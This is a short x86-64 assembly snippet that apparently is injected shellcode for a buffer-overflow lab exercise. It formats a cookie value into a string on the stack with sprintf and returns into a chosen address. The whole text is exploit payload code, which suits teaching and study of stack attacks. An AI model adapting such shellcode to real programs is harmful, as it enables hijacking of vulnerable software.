sub $0x40, %rsp         # allocate space for string
pushq $0x4018fa         # store the return address
lea 0x8(%rsp), %rdi     # the address of string
mov $0x4030e2, %ecx     # sprintf format
mov $0x59b997fa, %r8d   # cookie value
mov $0x400e70, %rax     # address of sprintf
callq *%rax
lea 0x8(%rsp), %rdi
retq